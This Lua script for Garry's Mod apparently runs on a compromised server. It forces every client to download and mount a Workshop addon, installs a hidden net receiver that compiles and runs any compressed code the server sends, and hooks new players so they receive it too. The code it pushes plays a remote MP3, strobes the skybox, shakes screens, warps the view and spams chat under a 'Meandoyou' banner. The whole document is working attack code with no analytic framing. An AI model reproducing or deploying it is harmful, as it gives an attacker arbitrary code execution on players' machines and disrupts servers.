function file.Write() return end
timer.Simple(1,function()
local function rdm_str(len)
    if !len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end
for k, v in pairs(player.GetAll()) do
    v:SendLua(&quot;steamworks.DownloadUGC( 3249312195, function( name )game.MountGMA( name )end)&quot;)
end
local net_string = rdm_str(25)
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;spamlgfngfgjrfggtf&quot;..net_string,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    end
end)
 
local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
 
SendToClient([[
local songURL = &quot;https://dl.sndup.net/gs7p/Trap.mp3&quot;


local text = &quot;Meandoyou Presentes&quot;
local textToShow = &quot;&quot;
local startTime = CurTime()
local charIndex = 0
local WriteK = math.Clamp(ScrH() / 2.31, 0.85, 1.005)
local fontSize = WriteK * 35

surface.CreateFont(&quot;fontsdegay&quot;, {
    font = &quot;Umberto&quot;,
    extended = false,
    size = fontSize,
    weight = 15,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
})

hook.Add(&quot;HUDPaint&quot;, &quot;textmedame&quot;, function()
    local elapsedTime = CurTime() - startTime

    if charIndex &lt; #text then
        local deltaTime = math.Clamp(elapsedTime * 15, 0, #text) -- Adjust the speed of typing here
        textToShow = string.sub(text, 1, math.floor(deltaTime))
        charIndex = math.floor(deltaTime)
    else
        textToShow = text
    end

    local x = ScrW() / 2 - surface.GetTextSize(textToShow) / 2
    local y = ScrH() / 2 - fontSize / 2

    for i = 1, #textToShow do
        local char = string.sub(textToShow, i, i)
        local charWidth = surface.GetTextSize(char)
        draw.SimpleTextOutlined(char, &quot;fontsdegay&quot;, x, y,Color(255,255,255), TEXT_ALIGN_LEFT, TEXT_ALIGN_RIGHT, 1, Color(0, 0, 0))
        x = x + charWidth
    end
end)

-- Set up a timer to remove the HUDPaint hook after 3 seconds
timer.Simple(2.5, function()
    hook.Remove(&quot;HUDPaint&quot;, &quot;textmedame&quot;)
end)

timer.Simple(25,function()

  local isWhite = true

  timer.Create(&quot;SkyboxColorTimer&quot;, 0.02, 0, function()
      if isWhite then
          function GAMEMODE:PostDraw2DSkyBox()
              local col = Color(255, 255, 255)
              render.Clear(col.r, col.g, col.b, 255)
              return !!1
          end
          function GAMEMODE:PreDrawSkyBox()
              local col = Color(255, 255, 255)
              render.Clear(col.r, col.g, col.b, 255)
              return !!1
          end
      else
          function GAMEMODE:PostDraw2DSkyBox()
              local col = Color(0, 0, 0)
              render.Clear(col.r, col.g, col.b, 255)
              return !!1
          end
          function GAMEMODE:PreDrawSkyBox()
              local col = Color(0, 0, 0)
              render.Clear(col.r, col.g, col.b, 255)
              return !!1
          end
      end
      isWhite = not isWhite
  end)
  

for i = 1,1 do
  ParticleEffectAttach(&quot;vivaldi&quot;,PATTACH_ABSORIGIN_FOLLOW,LocalPlayer(),0)
end
end)
local AMP = 16700

sound.PlayURL(songURL , 
  &quot;mono&quot; , function(sc , err , errname)

    if(IsValid(sc)) then
      
      station = sc
      station:Play()
      
    else
    
      station = nil

    end

smoothdata = {}

for i = 1, 128 do
smoothdata[i] = 0
end

function draw.Circle( x, y, radius, seg )
  local cir = {}

  table.insert( cir, { x = x, y = y, u = 0.5, v = 0.5 } )
  for i = 0, seg do
    local a = math.rad( ( i / seg ) * -360 )
    table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
  end

  local a = math.rad( 0 ) -- This is needed for non absolute segment counts
  table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )

  surface.DrawPoly( cir )
end

mats = Entity(0):GetMaterials()

red,green,blue = 150,50,0
color = Color(red,green,blue, 50)
smoothpos = Vector(0,0,0)


local colors = {
    Color(0, 0, 0, 200),
    Color(255, 255, 255, 200),
}


hook.Add(&quot;PostDrawHUD&quot;,&quot;3D_Easy_FFT&quot;,function()
data = {}
station:FFT(data, FFT_256)
local pl = LocalPlayer()
local pos = EyePos()
smoothpos = LerpVector(2 * FrameTime(),smoothpos,Vector(LocalPlayer():GetPos().x,LocalPlayer():GetPos().y,LocalPlayer():GetPos().z))
local ang = Angle(0, LocalPlayer():EyeAngles().y-90, -90)
local barres = 128
local disctance = 100
for i = 1, barres do
    -- Utiliser les couleurs de la table de mani&egrave;re cyclique
    local col = colors[(i - 1) % #colors + 1]

smoothdata[i] = Lerp(3*FrameTime(),smoothdata[i],data[i])
local a = math.rad( ( i / barres ) * 390 )
hook.Add( &quot;CalcView&quot;, &quot;MyCalcView&quot;, MyCalcView )

timer.Simple(1, function()
    local trambledevantsecode = {}
    
    hook.Add(&quot;HUDPaint&quot;, &quot;woawsabouge&quot;,function()
        for k,v in pairs(trambledevantsecode) do
            v()
        end
    end)

 trambledevantsecode[&quot;CoolEffect&quot;] = function()
            local tbl = {}
            station:FFT(tbl,FFT_2048)
            xpcall(function()
                local fal = 0
            for i=4,6 do
                fal = fal + tbl[i]
            end
            if fal &gt; 0.8 then
                local oneid = &quot;newhud&quot;..math.random(100, 300)..&quot;id&quot;
                            
                util.ScreenShake( Vector( 0, 0, 0 ), 5, 5, 2, 2500 ) 
                for _, v in ipairs(player.GetAll()) do
                    v:SetWeaponColor(Vector(255, 255, 255))
                end
            end
            end,function()
            end)
        end

end)

cam.Start3D()
cam.Start3D2D(smoothpos-Vector(math.sin(a) * disctance,math.cos(a) * disctance,0),ang,1)
draw.NoTexture()
draw.RoundedBoxEx(0,0,0,2,smoothdata[i]*AMP,col)
cam.End3D2D()
cam.End3D()
end

a = 0








function MyCalcView(ply,pos,angles,fov)
for i = 1,128 do
a = a + smoothdata[i]
end
a = a / 128
view = {}
view.origin = pos
view.angles = angles
view.fov = fov - a * 1555
return view
end

hook.Add(&quot;CalcView&quot;,&quot;MyCalcView&quot;,MyCalcView)

timer.Simple(207.5,function()
hook.Remove( &quot;PostDrawHUD&quot;, &quot;3D_Easy_FFT&quot;)
hook.Remove( &quot;CalcView&quot;, &quot;MyCalcView&quot;)
LocalPlayer():ConCommand(&quot;stopsound&quot;)
end)
end)
end)







timer.Create(&quot;spamchatbienchiant&quot;, 1, 0, function()
  local time = 0
  local Message = {
      &quot;        . Vivaldi ♪ Meandoyou ♪&quot;,
      &quot;       .. Vivaldi ♪ Meandoyou ♪♪&quot;,
      &quot;      ... Vivaldi ♪ Meandoyou ♪♪♪&quot;,
      &quot;     .... Vivaldi ♪ Meandoyou ....&quot;,
      &quot;    ..... Vivaldi ♪ Meandoyou .....&quot;,
      &quot;   ...... Vivaldi ♪ Meandoyou ......&quot;,
      &quot;  ....... Vivaldi ♪ Meandoyou .......&quot;,
      &quot; ........ Vivaldi ♪ Meandoyou ........&quot;,
      &quot;......... Vivaldi ♪ Meandoyou .........&quot;,
      &quot; ........ Vivaldi ♪ Meandoyou ........&quot;,
      &quot;  ....... Vivaldi ♪ Meandoyou .......&quot;,
      &quot;   ...... Vivaldi ♪ Meandoyou ......&quot;,
      &quot;    ..... Vivaldi ♪ Meandoyou .....&quot;,
      &quot;     .... Vivaldi ♪ Meandoyou ....&quot;,
      &quot;      ... Vivaldi ♪ Meandoyou ...&quot;,
      &quot;       .. Vivaldi ♪ Meandoyou ..&quot;,
      &quot;        . Vivaldi ♪ Meandoyou ♪&quot;,
  }

  local isBlack = true -- Variable pour basculer entre le texte noir et blanc

  for _, line in pairs(Message) do
      time = time + 0.1
      timer.Simple(time, function()
          if isBlack then
              chat.AddText(Color(0, 0, 0), line) -- Texte noir
          else
              chat.AddText(Color(255, 255, 255), line) -- Texte blanc
          end
          isBlack = not isBlack -- Bascule entre vrai (true) et faux (false)
      end)
  end
end)





]])
end)
